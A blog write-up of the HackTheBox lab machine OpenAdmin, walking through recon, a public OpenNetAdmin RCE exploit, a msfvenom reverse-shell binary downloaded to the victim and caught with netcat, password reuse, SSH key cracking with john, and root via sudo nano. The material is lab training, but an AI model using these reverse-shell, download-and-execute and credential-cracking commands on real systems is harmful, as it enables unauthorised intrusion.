---
layout: page
title: OpenAdmin
description: OpenAdmin from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/openadmin/logo.png" title="HTB OpenAdmin Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/OpenAdmin">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we are for another one.  We are working on OpenAdmin this time.

Give nmap a run to try identify services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.171
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 13:55 AEDT
Nmap scan report for 10.10.10.171
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   8.70 ms  10.10.16.1
2   17.51 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```
{% endraw %}

<br />
Run curl -I against port 80 to pull the headers to try to identify some technologies.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ curl -I http://10.10.10.171    
HTTP/1.1 200 OK
Date: Mon, 27 Jan 2025 02:56:52 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Thu, 21 Nov 2019 14:08:45 GMT
ETag: "2aa6-597dbd5dcea8b"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```
{% endraw %}

<br />
Ffuf the webserver to discover directories and files.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.171/FUZZ -e txt,bak,pdf,xml -fs 10918

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : txt bak pdf xml 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10918
________________________________________________

music                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 9ms]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 11ms]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 13ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 12ms]
:: Progress: [1102795/1102795] :: Job [1/1] :: 3636 req/sec :: Duration: [0:06:15] :: Errors: 0 ::
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/openadmin/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page looking for something juicy.

{% raw %}
```html
view-source:http://10.10.10.171/music/

<!DOCTYPE html>
<html lang="zxx">
<head>
	<title>Music | NOT LIVE/NOT FOR PRODUCTION USE</title>
	<meta charset="UTF-8">
	<meta name="description" content="Music HTML Template">
	<meta name="keywords" content="music, html">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

<snip>

    	    <div class="user-panel">
				<a href="../ona" class="login">Login</a>
				<a href="" class="register">Create an account</a>
			</div>

<snip>

	<!--====== Javascripts & Jquery ======-->
	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/jquery.slicknav.min.js"></script>
	<script src="js/owl.carousel.min.js"></script>
	<script src="js/mixitup.min.js"></script>
	<script src="js/main.js"></script>

	</body>
</html>
```
{% endraw %}

<br />
Check the ../ona directory that was listed in the music page.  Notice the version.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/openadmin/ona.png" title="Ona" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search the version on the GitHub looking for an exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/openadmin/github.png" title="GitHub Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the python exploit that we found.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ wget https://raw.githubusercontent.com/amriunix/ona-rce/refs/heads/master/ona-rce.py
--2025-01-27 14:32:51--  https://raw.githubusercontent.com/amriunix/ona-rce/refs/heads/master/ona-rce.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8000::154, 2606:50c0:8002::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2443 (2.4K) [text/plain]
Saving to: ‘ona-rce.py’

ona-rce.py                                                 100%[========================================================================================================================================>]   2.39K  --.-KB/s    in 0s      

2025-01-27 14:32:52 (70.2 MB/s) - ‘ona-rce.py’ saved [2443/2443]
```
{% endraw %}

<br />
Run the exploit and get a shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ python3 ona-rce.py exploit http://10.10.10.171/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$
```
{% endraw %}

<br />
Generate a msfvenom elf file that creates a reverse tcp shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f elf -o shell           
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell

┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ python -m 'http.server'                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ nc -nlvp 4444    
listening on [any] 4444 ...
```
{% endraw %}

<br />
Transfer the binary to the victim machine.

{% raw %}
```bash
sh$ wget http://10.10.16.12:8000/shell
--2025-01-27 03:38:19--  http://10.10.16.12:8000/shell
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: 'shell'

     0K                                                       100% 28.5M=0s

2025-01-27 03:38:19 (28.5 MB/s) - 'shell' saved [194/194]
```
{% endraw %}

<br />
Execute the payload.

{% raw %}
```bash
sh$ ./shell
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ nc -nlvp 4444    
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.171] 48658
python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@openadmin:/opt/ona/www$
```
{% endraw %}

<br />
Check the /var/www folder.  Notice the internal folder and get permission denied.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www$ cd /var/www
cd /var/www
www-data@openadmin:/var/www$ ls
ls
html  internal  ona
www-data@openadmin:/var/www$ cd internal
cd internal
bash: cd: internal: Permission denied
```
{% endraw %}

<br />
Get a list of the services that are listening.

{% raw %}
```bash
www-data@openadmin:/var/www$ netstat -antup
netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.10.10.171:52702      1.1.1.1:53              SYN_SENT    -                   
tcp        0    300 10.10.10.171:58986      10.10.16.12:4444        ESTABLISHED 1619/sh             
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.171:80         10.10.16.12:53936       ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:35534         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 10.10.10.171:34605      1.1.1.1:53              ESTABLISHED -
```
{% endraw %}

<br />
Check the 52846 port and see what it is serving.

{% raw %}
```bash
www-data@openadmin:/var/www$ cd /dev/shm
cd /dev/shm
www-data@openadmin:/dev/shm$ wget 127.0.0.1:52846
wget 127.0.0.1:52846
--2025-01-27 05:10:50--  http://127.0.0.1:52846/
Connecting to 127.0.0.1:52846... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2519 (2.5K) [text/html]
Saving to: 'index.html'

index.html          100%[===================>]   2.46K  --.-KB/s    in 0s      

2025-01-27 05:10:50 (385 MB/s) - 'index.html' saved [2519/2519]

www-data@openadmin:/dev/shm$ ls
ls
index.html
```
{% endraw %}

<br />
Cat the index.html file that we just downloaded.  Looks like some kind of login page.

{% raw %}
```html
<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <snip>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
{% endraw %}

<br />
Check the sites-available.

{% raw %}
```bash
www-data@openadmin:/etc/apache2/sites-available$ cat internal.conf 
cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
{% endraw %}

<br />
Run id to see what user we are.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endraw %}

<br />
Run sudo -l to see if we can run anything as sudo.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www$ sudo -l
sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit
```
{% endraw %}

<br />
Run uname -a to get the linux version.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www$ uname -a
uname -a
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
{% endraw %}

<br />
Check the /etc/issues file to id the Ubuntu version.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www$ cat /etc/issue
cat /etc/issue
Ubuntu 18.04.3 LTS \n \l
```
{% endraw %}

<br />
Check the /etc/hosts file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.171    openadmin.htb internal.openadmin.htb 

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Check the /etc/passwd file to identify the users.

{% raw %}
```bash
www-data@openadmin:/opt/ona/www/include$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
{% endraw %}

<br />
Run env to get the environment variables.

{% raw %}
```bash
www-data@openadmin:/dev/shm$ env
env
PWD=/dev/shm
SHLVL=1
_=/usr/bin/env
OLDPWD=/opt/ona/www/include
```
{% endraw %}

<br />
Check the /opt/ona/www/local/config/database_settings.inc.php file to see for any potential passwords.

{% raw %}
```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

<snip>
```
{% endraw %}

<br />
Use the password from the file to ssh into the jimmy account.  Password re-use for the win!

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ ssh jimmy@10.10.10.171                    
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ED25519) to the list of known hosts.
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  9 02:02:41 UTC 2025

  System load:  0.0               Processes:             187
  Usage of /:   30.8% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```
{% endraw %}

<br />
Run sudo -l to see if we can run anything as sudo with jimmy.

{% raw %}
```bash
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on openadmin.
```
{% endraw %}

<br />
Check the internal folder that we should have permission to now.

{% raw %}
```bash
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
```
{% endraw %}

<br />
Curl against the main.php from the internal website.

{% raw %}
```bash
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

<redacted>
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
{% endraw %}

<br />
Save the id_rsa to a file on the attack machine and chmod it to 600.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ cat id_rsa                  
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

<redacted>
-----END RSA PRIVATE KEY-----
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ chmod 600 id_rsa
```
{% endraw %}

<br />
Use john the ripper to crack the id_rsa to get the passphrase.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ ssh2john id_rsa > john_id_rsa   
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:02 DONE (2025-06-09 13:11) 0.4219g/s 4039Kp/s 4039Kc/s 4039KC/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Use the id_rsa and passphrase to login to joanna.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/openadmin]
└─$ ssh -i id_rsa joanna@10.10.10.171                           
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun  9 03:13:16 UTC 2025

  System load:  0.0               Processes:             194
  Usage of /:   30.9% of 7.81GB   Users logged in:       1
  Memory usage: 15%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$
```
{% endraw %}

<br />
Run sudo -l again for the joanna user.

{% raw %}
```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
{% endraw %}

<br />
Check the nano in GTFOBins.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/openadmin/gtfo.png" title="GTFOBins" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gtfobins.github.io/gtfobins/nano/">https://gtfobins.github.io/gtfobins/nano/</a>

<br />
Sudo into the nano command.

{% raw %}
```bash
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```
{% endraw %}

<br />
Enter the command from GTFOBins and drop into a root shell.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/openadmin/nano.png" title="Nano Shell" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the user.txt flag.

{% raw %}
```bash
# cat /home/joanna/user.txt
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:1c:2f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:1c2f/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe95:1c2f/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt                                                                                                  M-F New Buffer
<redacted>
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:1c:2f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:1c2f/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:fe95:1c2f/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
With that flag, we can close the OpenAdmin box.  I appreciate the read so much.  See you in the next box.